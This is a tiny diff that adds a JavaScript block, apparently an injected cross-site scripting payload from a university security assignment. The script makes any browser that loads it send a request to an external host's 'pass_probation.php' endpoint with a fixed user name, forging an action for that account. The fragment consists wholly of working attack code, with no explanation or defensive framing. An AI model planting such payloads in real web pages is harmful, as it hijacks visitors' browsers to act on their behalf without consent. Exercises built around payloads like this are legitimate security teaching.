@@ -1,0 +1,4 @@
+<script> var x = new XMLHttpRequest(); 
+x.open("GET", "http://assignment-hermes.unimelb.life/pass_probation.php?user="+"katsuhidei"); 
+x.send(); 
+</script>
